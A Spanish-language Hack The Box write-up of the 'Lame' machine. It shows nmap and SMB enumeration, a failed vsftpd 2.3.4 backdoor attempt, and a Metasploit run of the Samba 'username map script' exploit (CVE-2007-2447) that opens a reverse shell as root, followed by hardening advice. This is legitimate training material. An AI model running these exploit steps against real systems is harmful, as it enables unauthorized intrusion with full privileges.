---
title: "HTB Write-up: Lame"
date: 2026-03-28
draft: false
description: "Write-up de la máquina Lame de Hack The Box. Dificultad Easy con OS Linux. Explotación de RCE en Samba 3.0.20 mediante CVE-2007-2447 (Username Map Script)."
tags: ["HackTheBox", "Linux", "Easy", "Samba", "CVE-2007-2447", "Metasploit", "RCE"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Resolución de **Lame**, una de las máquinas más clásicas de Hack The Box. Dificultad **Easy** con OS **Linux**. El vector principal es una vulnerabilidad de ejecución remota de código en **Samba 3.0.20** (CVE-2007-2447), que nos otorga acceso directo como **root**.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                   |
|----------------|-------------------------------------------|
| **Nombre**     | Lame                                      |
| **OS**         | Linux                                     |
| **Dificultad** | Easy                                      |
| **IP**         | 10.129.10.27                              |
| **Técnicas**   | RCE, CVE-2007-2447, Username Map Script   |
| **CVE**        | CVE-2007-2447                             |

---

## 📑 1. Reconocimiento

El objetivo inicial es identificar la superficie de ataque. Realizamos un escaneo exhaustivo de puertos y servicios con `nmap`.

### Escaneo de Nmap

```
Nmap scan report for 10.129.10.27
Host is up (0.044s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.15.237
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

**Análisis de superficie:**
- **FTP (21):** `vsftpd 2.3.4` — Versión muy antigua. El login anónimo está habilitado.
- **SSH (22):** Versión antigua pero sin exploits directos accesibles.
- **SMB (139/445):** `Samba 3.0.20` — Versión conocida por tener vulnerabilidades críticas de RCE.

---

## 📂 2. Enumeración de Servicios

### FTP — Login Anónimo

Probamos si hay archivos expuestos en el servidor FTP accediendo como `anonymous`.

```bash
┌─[root@htb]─[~]
└──╼ #ftp 10.129.10.27
Connected to 10.129.10.27.
220 (vsFTPd 2.3.4)
Name (10.129.10.27:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10709|).
150 Here comes the directory listing.
226 Directory send OK.
```

No se encontraron archivos. El servicio está activo pero el directorio está vacío.

### SMB — Enumeración de Recursos

Usamos `smbmap` para listar los recursos compartidos y sus permisos.

```bash
┌─[root@htb]─[~]
└──╼ #smbmap -H 10.129.10.27
[+] IP: 10.129.10.27:445        Name: 10.129.10.27              Status: Authenticated
Disk                                                    Permissions     Comment
print$                                                  NO ACCESS       Printer Drivers
tmp                                                     READ, WRITE     oh noes!
opt                                                     NO ACCESS
IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
```

El recurso `/tmp` tiene permisos de **READ, WRITE**. Lo inspeccionamos con `smbclient`:

```bash
┌─[root@htb]─[~]
└──╼ #smbclient //10.129.10.27/tmp
Anonymous login successful
smb: \> ls
  .                                   D        0  Sat Mar 28 13:20:59 2026
  ..                                 DR        0  Sat Oct 31 07:33:58 2020
  5688.jsvc_up                        R        0  Sat Mar 28 12:55:35 2026
  .ICE-unix                          DH        0  Sat Mar 28 12:54:24 2026
  vmware-root                        DR        0  Sat Mar 28 12:54:30 2026
  .X11-unix                          DH        0  Sat Mar 28 12:54:50 2026
  .X0-lock                           HR       11  Sat Mar 28 12:54:50 2026
  vgauthsvclog.txt.0                  R     1600  Sat Mar 28 12:54:23 2026
```

No hay archivos de configuración ni llaves SSH interesantes. Procedemos a investigar exploits por versión de software.

---

## 💥 3. Explotación

### Intento 1: Backdoor en VSFTPd 2.3.4 — ❌ Fallido

La versión `vsftpd 2.3.4` es conocida por haber sido comprometida en sus repositorios oficiales en 2011, incluyendo un backdoor que abre el puerto **6200/TCP** al enviarle un usuario terminado en `:)`.

```bash
[msf](Jobs:0 Agents:0) >> search VSFTPd
[msf](Jobs:0 Agents:0) >> use 1
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> set RHOST 10.129.10.27
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> set LHOST tun0
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> run
[*] Started reverse TCP handler on 10.10.15.237:4444
[!] 10.129.10.27:21 - Unable to connect to backdoor on 6200/TCP. Cooldown?
[*] Exploit completed, but no session was created.
```

**¿Por qué falló?** Aunque la versión coincide, el exploit requiere que el puerto **6200** se abra después del trigger. Si hay un firewall o una versión parcheada del SO, el puerto nunca se vuelve accesible. En esta máquina, el backdoor del FTP está presente en la versión pero mitigado a nivel de red.

---

### Intento 2: Samba "Username Map Script" CVE-2007-2447 — ✅ Exitoso

**Samba 3.0.20** es vulnerable a CVE-2007-2447. Esta vulnerabilidad ocurre porque Samba permite la ejecución de scripts externos para mapear nombres de usuario (`username map script`). Si enviamos un nombre de usuario que contenga **metacaracteres de shell** (como `` ` `` o `$()`), Samba los ejecuta directamente en el sistema operativo sin sanitizar la entrada.

```bash
[msf](Jobs:0 Agents:0) >> use exploit/multi/samba/usermap_script
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set RHOSTS 10.129.10.27
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set LHOST tun0
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> run
[*] Started reverse TCP handler on 10.10.15.237:4444
[*] Command shell session 1 opened (10.10.15.237:4444 -> 10.129.10.27:49024) at 2026-03-28 13:26:18 +0100
```

**¡Éxito!** Tenemos una shell abierta.

---

## 🏁 4. Post-Explotación y Flags

Debido a la naturaleza de la vulnerabilidad, el comando se ejecuta con los privilegios del proceso de Samba, que en esta máquina corre como **root**.

### Verificación de Privilegios

```bash
id
uid=0(root) gid=0(root)
```

Acceso total como root desde el primer momento. No se requiere escalada de privilegios.

### 🚩 User Flag

```bash
root@lame:/# cat /home/makis/user.txt
```

{{< spoiler text="user.txt" >}}
`********************************`
{{< /spoiler >}}

### 👑 Root Flag

```bash
root@lame:/# cat /root/root.txt
```

{{< spoiler text="root.txt" >}}
`********************************`
{{< /spoiler >}}

---

## 📝 5. Resumen y Lecciones Aprendidas

**Ruta de compromiso:**
1. **Recon** → Nmap detecta `Samba 3.0.20` en puertos 139/445.
2. **Enumeración** → `smbmap` confirma acceso al recurso `/tmp`. FTP anónimo pero vacío.
3. **Foothold** → CVE-2007-2447 con Metasploit (`usermap_script`). Shell directa como **root**.

**Lo que aprendí con esta máquina:**
- La importancia de identificar versiones concretas de servicios, no solo los puertos abiertos.
- El backdoor de vsftpd 2.3.4 puede estar presente en la versión pero bloqueado a nivel de red — siempre hay que tener un plan B.
- Samba `username map script` es un ejemplo clásico de **command injection** por falta de sanitización de entrada en un parámetro de configuración.
- Cuando hay múltiples servicios vulnerables, priorizar los que tienen mayor probabilidad de éxito por el contexto del sistema.

---

## 🛠️ 6. Mitigaciones (Hardening)

| Problema                        | Recomendación                                                                 |
|---------------------------------|-------------------------------------------------------------------------------|
| Samba 3.0.20 desactualizado     | Actualizar a una versión moderna con soporte activo.                          |
| `username map script` activo    | Deshabilitar o auditar esta opción en `smb.conf`.                             |
| FTP anónimo habilitado          | Deshabilitar el acceso sin credenciales aunque el directorio esté vacío.      |
| SMB expuesto a toda la red      | Aplicar reglas de firewall para restringir 139/445 a IPs de confianza.        |
